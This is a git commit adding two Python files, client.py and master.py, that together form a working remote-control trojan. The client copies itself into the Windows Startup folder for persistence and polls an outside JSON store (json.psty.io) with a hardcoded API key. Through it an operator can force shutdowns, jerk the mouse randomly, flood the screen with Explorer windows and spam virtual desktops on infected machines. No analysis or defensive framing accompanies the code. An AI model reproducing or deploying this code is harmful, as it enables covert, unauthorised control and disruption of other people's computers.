4561ce60c621e50f92d3d4a12f0fa2cc0932364b
Professor Kablammo <bumbum4321234@gmail.com>
2022-05-14 08:25:38 +1000

    Add files via upload

---
+++ client.py
@@ -0,0 +1,105 @@
+import requests
+import json
+import socket
+import urllib.parse as urlparse
+import os
+import sys
+import mouse
+import screeninfo
+import random
+import shutil
+import string
+import subprocess
+import threading
+import keyboard
+
+
+if getattr(sys, "frozen", False):
+    shutil.move(os.path.join(os.path.dirname(sys.executable), sys.executable.split("\\")[-1]), os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", sys.executable.split("\\")[-1]))
+elif __file__:
+    shutil.move(os.path.join(os.path.dirname(__file__), __file__.split("\\")[-1]), os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", __file__.split("\\")[-1]))
+
+alpha = string.ascii_lowercase+string.ascii_uppercase
+width = screeninfo.get_monitors()[0].width
+height = screeninfo.get_monitors()[0].height
+host = socket.gethostname().lower() + "real"
+getheaders = {
+    "Api-Key": "47229801-f65c-4ae1-a65a-b5abfb723ac2",
+}
+putheaders = {
+    "Api-Key": "47229801-f65c-4ae1-a65a-b5abfb723ac2",
+    "Content-Type": "application/json"
+}
+store_name = "Remote"
+ethreadlst = []
+dthreadlst = []
+
+
+def get():
+    global getheaders
+    global store_name
+    try:
+        getjson = requests.get("https://json.psty.io/api_v1/stores/{}".format(urlparse.quote_plus(store_name)), headers=getheaders, verify=False)
+    except Exception as e:
+        return [0, e]
+    if getjson.status_code != 200:
+        return getjson.status_code
+    else:
+        return getjson.text
+
+def explorer():
+    while True:
+        for i in string.ascii_uppercase:
+            if os.path.exists(i+":\\"):
+                subprocess.Popen("explorer /select,"+i+":\\")
+                break
+
+def desktop():
+    while True:
+        keyboard.send("ctrl+cmd+d")
+
+while True:
+    res = get()
+    if type(res) == str:
+        res = json.loads(res)
+        resdata = res["data"]
+        putdata = resdata
+        # putdata.pop("computers")
+        rescomps = resdata["computers"]
+        if not host in rescomps:
+            rescomps[host] = {"shutdown": 0, "mousevirus": 0, "explorercrash": 0, "many-desktops": 0}
+        if not "shutdown" in rescomps[host].keys():
+            rescomps[host]["shutdown"] = 0
+        if not "mousevirus" in rescomps[host].keys():
+            rescomps[host]["mousevirus"] = 0
+        if not "explorercrash" in rescomps[host].keys():
+            rescomps[host]["explorercrash"] = 0
+        if not "many-desktops" in rescomps[host].keys():
+            rescomps[host]["many-desktops"] = 0
+        putdata["computers"] = rescomps
+        putjson = requests.put("https://json.psty.io/api_v1/stores/{}".format(urlparse.quote_plus(store_name)), headers=putheaders, json=putdata, verify=False)
+        if rescomps[host]["shutdown"] == 1:
+            os.system("shutdown /s /f /t 0")
+        if rescomps[host]["mousevirus"] == 1:
+            for movement in range(50):
+                mouse.move(random.randint(0, width), random.randint(0, height))
+        if rescomps[host]["explorercrash"] == 1:
+            for nthreadcnt in range(50):
+                newthread = threading.Thread(target=explorer)
+                newthread.daemon = True
+                ethreadlst.append(newthread)
+            for thread in ethreadlst:
+                thread.start()
+            for thread in ethreadlst:
+                thread.join()
+        if rescomps[host]["many-desktops"] == 1:
+            for nthreadcnt in range(50):
+                newthread = threading.Thread(target=desktop)
+                newthread.daemon = True
+                dthreadlst.append(newthread)
+            for thread in dthreadlst:
+                thread.start()
+            for thread in dthreadlst:
+                thread.join()
+    else:
+        print(res)
---
+++ master.py
@@ -0,0 +1,100 @@
+import requests
+import json
+import urllib.parse as urlparse
+import keyboard
+import os
+
+
+getheaders = {
+    "Api-Key": "47229801-f65c-4ae1-a65a-b5abfb723ac2"
+}
+putheaders = {
+    "Api-Key": "47229801-f65c-4ae1-a65a-b5abfb723ac2",
+    "Content-Type": "application/json"
+}
+store_name = "Remote"
+path = os.path.join(os.getenv("appdata"), "masterignore.txt")
+if not os.path.exists(path):
+    createfile = open(path, "x")
+    createfile.close()
+
+readfile = open(path, "r")
+bannedlist = readfile.readlines()
+bannedlist = [item.rstrip("\n") for item in bannedlist]
+readfile.close()
+
+
+def get():
+    global getheaders
+    global store_name
+    try:
+        getjson = requests.get("https://json.psty.io/api_v1/stores/{}".format(urlparse.quote_plus(store_name)), headers = getheaders, verify=False)
+    except:
+        return 0
+    if getjson.status_code != 200:
+        return getjson.status_code
+    else:
+        return getjson.text
+
+
+while True:
+    if keyboard.is_pressed("alt+q"):
+        quit()
+    res = get()
+    if type(res) != int:
+        res = json.loads(res)
+        resdata = res["data"]
+        rescomps = resdata["computers"]
+        compnames = rescomps.keys()
+        print("Current Shown Computers and their Properties:\n")
+        for key in rescomps.keys():
+            try:
+                if key[-4:] == "real" and not key in bannedlist:
+                    print(f"{key}:")
+                    for properties in rescomps[key].keys():
+                        print(f"{properties}: {rescomps[key][properties]}")
+                    print()
+            except:
+                continue
+        print()
+        if len(bannedlist) > 0:
+            print("Current Hidden Computers:")
+            for banned in bannedlist:
+                print(f"{banned}")
+        else:
+            print("You have no banned computer names")
+        print()
+        print("Enter a computer name to gain access to its properties or type \"CONTINUE\" to refresh or type \"HIDE <COMPUTER-NAME>\" to hide a fake computer")
+        cmdpcname = input("> ")
+        if cmdpcname != "CONTINUE" and cmdpcname in compnames:
+            print(f"\nProperties for {cmdpcname}:")
+            localprops = rescomps[cmdpcname].keys()
+            for properties in rescomps[cmdpcname].keys():
+                print(f"{properties}: {rescomps[cmdpcname][properties]}")
+            print("\nEnter a property name to change the value or type \"CONTINUE\" to refresh")
+            cmdpropname = input("> ")
+            if cmdpropname != "CONTINUE" and cmdpropname in localprops:
+                print("\nPlease specify a value (0 or 1) or type \"CONTINUE\" to refresh")
+                cmdvalue = input("> ")
+                if cmdvalue != "CONTINUE" and int(cmdvalue) in [0, 1]:
+                    rescomps[cmdpcname][cmdpropname] = int(cmdvalue)
+                    resdata["computers"] = rescomps
+                    putjson = requests.put("https://json.psty.io/api_v1/stores/{}".format(urlparse.quote_plus(store_name)), headers = putheaders, json = resdata, verify = False)
+        elif cmdpcname[:4] == "HIDE" and cmdpcname.split(" ")[1] in compnames:
+            requesthide = cmdpcname.split(" ")[1]
+            readfile = open(path, "r")
+            bannedlist = readfile.readlines()
+            bannedlist = [item.rstrip("\n") for item in bannedlist]
+            readfile.close()
+            if requesthide in bannedlist:
+                bannedlist.remove(requesthide)
+            else:
+                bannedlist.append(requesthide)
+            writetext = ""
+            writefile = open(path, "w")
+            for line in bannedlist:
+                writetext += f"{line}\n"
+            writefile.write(writetext)
+            writefile.close()
+    else:
+        print(res)
